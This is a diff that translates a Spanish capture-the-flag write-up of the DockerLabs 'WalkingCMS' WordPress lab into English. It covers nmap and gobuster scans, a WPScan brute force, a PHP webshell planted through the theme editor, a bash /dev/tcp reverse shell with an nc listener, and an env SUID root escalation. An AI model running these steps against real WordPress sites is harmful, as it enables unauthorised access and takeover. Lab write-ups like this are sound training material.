@@ -1,154 +1,155 @@
 # WalkingCMS
 
-Pequeño Lab en modo **easy** de dockerlabs.
+<center><img src="https://dockerlabs.es/static/images/logos/logo.png" width="150px"></center>
 
-- [Reconocimiento](#reconocimiento)
-- [Escaneo](#escaneo)
-- [Enumeración](#enumeración)
-- [Explotación](#explotación)
-- [Escalada de privilegios](#escalada-de-privilegios)
+## Contents
 
-<br/>
+- [Reconnaissance](#reconnaissance)
+- [Scanning](#scanning)
+- [Enumeration](#enumeration)
+- [Exploitation](#exploitation)
+- [Privilege Escalation](#privilege-escalation)
 
-## Reconocimiento
+## Reconnaissance
 
-Se asume que la máquina objetivo se encuentra correctamente desplegada dentro de nuestra red de laboratorio (en este caso, utilizando Docker).
-Dado que la dirección IP del objetivo es proporcionada o fácilmente identificable dentro del entorno controlado, esta fase puede clasificarse como **reconocimiento pasivo**.
+It is assumed the target machine is correctly deployed inside our lab network (in this case, using Docker).  
+Since the target IP is provided or easily identifiable inside the controlled environment, this phase can be classified as **passive Reconnaissance**.
 
-En un escenario real, el reconocimiento pasivo se orienta a recopilar información sin interactuar directamente con el sistema objetivo (por ejemplo, utilizando fuentes OSINT, registros públicos o información de infraestructura).
-En este caso particular, al tratarse de un laboratorio aislado, la obtención de la IP se considera suficiente para dar inicio a la fase de enumeración activa.
+In a real scenario, passive reconnaissance focuses on gathering information without directly interacting with the target system (for example, using OSINT sources, public records or infrastructure information).  
+In this particular lab context, obtaining the IP is enough to start the active enumeration phase.
 
 ![enter image description here](https://i.imgur.com/3XmtBs3.png)
 
-<br/>
+## Scanning
 
-## Escaneo
+As a first step, a general port and service scan was performed using **Nmap**, aiming to identify what services are exposed on the target system and to get an initial attack-surface overview.
 
-Como primer paso, se realizó un escaneo general de puertos y servicios con la herramienta **Nmap**, con el objetivo de identificar qué servicios se encuentran expuestos en el sistema objetivo (target) y obtener un panorama inicial de la superficie de ataque.
+The executed command was:
 
-El comando ejecutado fue el siguiente:
+```
+nmap -p- --open -sC -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
+```
 
-    nmap -p- --open -sC -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
-
-- **-p-** → Escanea todos los puertos TCP (1 al 65535).
-
-- **--open** → Muestra únicamente los puertos abiertos.
-
-- **-sC** → Ejecuta los scripts por defecto de Nmap (NSE) para detección básica de vulnerabilidades y configuraciones inseguras.
-
-- **-sV** → Intenta identificar la versión de los servicios en ejecución.
-
-- **--min-rate** 5000 → Acelera el escaneo estableciendo un mínimo de 5000 paquetes por segundo.
-
-- **-n** → Evita la resolución DNS para mayor rapidez.
-
-- **-Pn** → Omite la fase de descubrimiento de host (se asume que el host está activo).
-
-- **172.17.0.2** → Dirección IP asignada a la máquina víctima dentro del entorno Docker.
+- **-p-** → Scans all TCP ports (1–65535).
+- **--open** → Shows only open ports.
+- **-sC** → Runs Nmap default NSE scripts for basic vulnerability/configuration checks.
+- **-sV** → Attempts to identify service versions.
+- **--min-rate 5000** → Speeds up the scan by setting a minimum of 5000 packets/sec.
+- **-n** → Disables DNS resolution for speed.
+- **-Pn** → Skips host discovery (assumes host is up).
+- **172.17.0.2** → IP assigned to the victim machine inside the Docker environment.
 
 ![enter image description here](https://i.imgur.com/1WvtOWR.png)
 
-### Resultados del escaneo
+### Scan results
 
-El escaneo realizado con Nmap reveló que el puerto **80/tcp** se encuentra abierto y asociado al servicio HTTP. Esto indica la presencia de un servidor web en ejecución dentro del objetivo.
+The Nmap scan revealed that **80/tcp** is open and associated with HTTP, indicating a web server running on the target.
 
-Con esta información inicial, se procedió a validar el hallazgo accediendo mediante un navegador a la dirección: `http://172.17.0.2` De esta manera, se confirma la existencia de un servicio web activo en el sistema. A partir de este punto, se iniciará la fase de enumeración web, con el fin de identificar posibles directorios ocultos, archivos sensibles o vulnerabilidades presentes en la aplicación expuesta. que hay un servicio web en efecto.
+With this information we validated the finding by opening a browser to `http://172.17.0.2`, confirming an active web service. From here we start the web enumeration phase to find hidden directories, sensitive files or vulnerabilities in the exposed application.
 
 ![enter image description here](https://i.imgur.com/RAoQPtY.png)
 
-<br/>
+### Enumeration
 
-### Enumeración
+The goal of this phase is to detect hidden or sensitive routes that could provide further information or serve as attack vectors.
 
-El objetivo de esta fase es detectar posibles rutas ocultas o sensibles que puedan ser utilizadas para obtener información adicional del sistema o ser explotadas como vectores de ataque.
+For this task we used **Gobuster**, which brute-forces the web directory tree using wordlists.
 
-Para esta tarea se empleó la herramienta **Gobuster**, la cual permite realizar un ataque de fuerza bruta sobre el árbol de directorios utilizando listas de palabras previamente definidas.
+```
+gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 20 -x php,txt,html,php.bak
+```
 
-    gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 20 -x php,txt,html,php.bak
+**Note**: Consider the following before running gobuster:
 
-**Nota**: Podríamos tener en cuenta las siguientes consideraciones antes de usar el gobuster:
-
-- **seclists** → Es un directorio genérico de diccionarios que se pueden instalar en parrot y kali utilizando `sudo apt install seclists`
-- **-x** → Es para definir las extensiones que queremos encontrar al escanear la web.
+- **seclists** → A generic collection of wordlists; installable on Parrot/Kali with `sudo apt install seclists`.
+- **-x** → Defines the extensions to search for when scanning the webserver.
 
 ![enter image description here](https://i.imgur.com/Acs91Dy.png)
 
-Tras la ejecución de Gobuster, se identificaron varios directorios accesibles dentro del servidor web. Entre ellos, uno de especial interés corresponde a `http://172.17.0.2/wordpress` por lo que si nos dirigimos al enlace visualizaremos una página de inicio.
+After running Gobuster several accessible directories were identified. One of interest was `http://172.17.0.2/wordpress` — visiting it showed a landing page.
 
 ![enter image description here](https://i.imgur.com/qAyX6Nu.png)
 
-Una vez identificado el directorio `/wordpress`, se determinó que el servicio corresponde a un CMS WordPress.
-Dado que este tipo de plataformas son propensas a vulnerabilidades relacionadas con su versión, plugins y temas instalados, se decidió realizar un análisis de seguridad empleando la herramienta **WPScan**.
+Once the `/wordpress` directory was identified, it was confirmed the service is a WordPress CMS. Since WordPress sites are often vulnerable depending on version, plugins and themes, we ran **WPScan** for a security assessment.
 
-    wpscan --url "http://172.17.0.2/wordpress" --enumerate u, vp
+```
+wpscan --url "http://172.17.0.2/wordpress" --enumerate u, vp
+```
 
 ![enter image description here](https://i.imgur.com/inH5Nxo.png)
 ![enter image description here](https://i.imgur.com/tSSdBwY.png)
 
-Utilizar algun script con payloads personalizados o desde metasploit también sería una buena opción, para aprovechar el **xmlrpc** ya que practicamente es un fósil que presenta riesgos de seguridad.
-Se identificó también que hay un tema activo y es el **twenty twentytwo**, algo que podría ser utilizado para explotar o algún plugin que tenga sus fallas o malas configuraciones a simple vista. En este caso el theme parece ser accessible desde una ruta en el navegador.
-Por otro lado, hay un usuario llamado "mario" que podría resultar útil en un ataque de fuerza bruta, es por esto que se decide escanear nuevamente con el **wpscan** y añadirle nuevos parámetros como un diccionario de combinaciones de passwords como lo es rockyou y un usuario.
+Using custom payload scripts or Metasploit could also be useful — for instance to target **xmlrpc**, which is an old feature that poses security risks.  
+We also identified the active theme **twentytwentytwo**, which might be abused if it or any plugin is vulnerable or misconfigured. The theme files are accessible through a browser path.  
+There is also a user called **mario**, which could be useful for a brute-force attack. Therefore we re-ran WPScan with a password list (e.g., rockyou) and the specific username.
 
-    wpscan --url "http://172.17.0.2/wordpress" --enumerate u, vp --passwords /home/criollo/rockyou.txt --usernames mario --random-user-agent
+```
+wpscan --url "http://172.17.0.2/wordpress" --enumerate u, vp --passwords /home/criollo/rockyou.txt --usernames mario --random-user-agent
+```
 
 ![enter image description here](https://i.imgur.com/CQAVinl.png)
 
-Con un ataque automático de brute force realizado por el wpscan y utilizando nuestro diccionario de combinaciones obtenemos la contraseña.
-Si analizamos nuevamente con el gobuster pero utilizando el directorio de wordpress, encontraríamos otros resultados que nos ayudarían a conseguir la forma de loguear o utilizar las credenciales que obtuvimos.
+An automated brute-force via WPScan using the dictionary obtained the password. If we run gobuster again scoped to the wordpress directory, other useful endpoints for login or using obtained credentials can be found.
 
 ![enter image description here](https://i.imgur.com/MfPg9z8.png)
 
-<br/>
+## Exploitation
 
-## Explotación
+We observe that:
 
-A continuación, podremos notar que:
+```
+http://172.17.0.2/wordpress/wp-login.php
+```
 
-    http://172.17.0.2/wordpress/wp-login.php
+leads to the WordPress login page — using the discovered credentials we can log into the dashboard.
 
-Es una ruta que parece llevarnos al inicio de sesión de nuestro Wordpress, si intentamos con las credenciales y obtenemos acceso a la dashboard de la plataforma.
 ![enter image description here](https://i.imgur.com/Tcr1UUP.png)
 
-Directamente se tuvo muy encuenta la revelación del wpscan con respecto al tema twenty twenty por lo que al saber que se puede acceder desde `http://172.17.0.2/wordpress/themes/twentytwentytwo/index.php`
-Podriamos usarlo para realizar una reverse shell editando el index.php, para eso dentro de la dashboard se posiciona en `Apariencia>Theme Code Editor`, luego se ubica el index.php y se editar, reemplazando el código original por un código php básico donde se reciba el query param **cmd**, una vez lo modifiquemos, le damos a **Update File** y ya podríamos acceder a la ruta del tema utilizando parámetros que en esta ocasión sería cmd=COMANDO.
+WPScan also revealed the `twentytwentytwo` theme. Since the theme can be accessed at `http://172.17.0.2/wordpress/themes/twentytwentytwo/index.php` we can use the Appearance → Theme File Editor in the dashboard to edit `index.php`, replacing it with a small PHP webshell that reads a `cmd` query parameter. After updating the file, visiting the theme path with `?cmd=COMMAND` executes that command.
+
 ![enter image description here](https://i.imgur.com/diWBn6X.png)
 
-Un claro ejemplo de esto sería ejecutar un comando a nivel de terminal en linux (esta máquina es debian) como es el `ls` y obtener algo como:
+For example, executing `ls` at the shell might return:
 
 ![enter image description here](https://i.imgur.com/XZDGpMy.png)
 
 ### Reverse shell
 
-Debido a que funciona, se puede utilizar un código en bash para ejecutar una reverse shell que nos permita establecer conexión desde shell. En este caso podríamos usar la de bash encontrada en [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), donde la IP será de nuetra máquina atacante al igual que el puerto de escucha.
+Because the webshell works, we can deploy a bash reverse shell (from pentestmonkey). The attacker IP and listening port must be set accordingly.
 
-Ejemplo:
+Example reverse shell:
 
-    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
 
-Aplicado sería:
+Applied as a parameter:
 
-    http://172.17.0.2/wordpress/themes/twentytwentytwo/index.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.0.0.1/443 0>%261"
+```
+http://172.17.0.2/wordpress/themes/twentytwentytwo/index.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.0.0.1/443 0>%261"
+```
 
-**Notas**:
+**Notes**:
 
-- Con el código de `%26`reemplazamos a la **&** y mejoramos la inyección de comando evitando errores.
-- Se utilizó el puerto 443 en lugar del 8080
-- Antes de ejecutar el webshell se utilizó netcat para ponerse a la escucha con el puerto designado `sudo nc -lvnp 443`
+- `%26` is used to replace `&` and improve command injection reliability.
+- Port `443` was used instead of `8080`.
+- Start the listener before executing the webshell: `sudo nc -lvnp 443`
 
-Luego de ejecutar el comando en la Web shell, conseguimos establecer conexión con nuestra máquina.
+After triggering the webshell command, the connection to our machine was established.
+
 ![enter image description here](https://i.imgur.com/dpYnHCI.png)
 
-<br/>
+### Privilege Escalation
 
-### Escalada de privilegios
+Move to `/home` and search for SUID files or other root escalation vectors:
 
-Moviéndose al `/home`se pueden buscar archivos en la raíz que permitan ser explotados o ejecutados para conseguir el `root`de la máquina.
-
-    find / -perm -4000 2>/dev/null
+```
+find / -perm -4000 2>/dev/null
+```
 
 ![enter image description here](https://i.imgur.com/3lkIOGD.png)
 
-Buscando en [GTFObins](https://gtfobins.github.io/gtfobins/env/) , `env` podría ser explotado de la siguiente manera con SUID obteniendo escalada de privilegios:
+Looking at [GTFObins](https://gtfobins.github.io/gtfobins/env/) shows `env` can be abused when SUID to escalate:
 
 ```
 sudo install -m =xs $(which env) .
@@ -156,9 +157,10 @@ sudo install -m =xs $(which env) .
 ./env /bin/sh -p
 ```
 
-Por lo que si lo aplicamos a nuestra máquina...
+Applying this on the target...
+
 ![enter image description here](https://i.imgur.com/HAivnyT.png)
 
-Logramos comprometerla y obtener el usuario root.
+We successfully compromised the machine and obtained the root user.
 
 _Written by **kur0bai**_
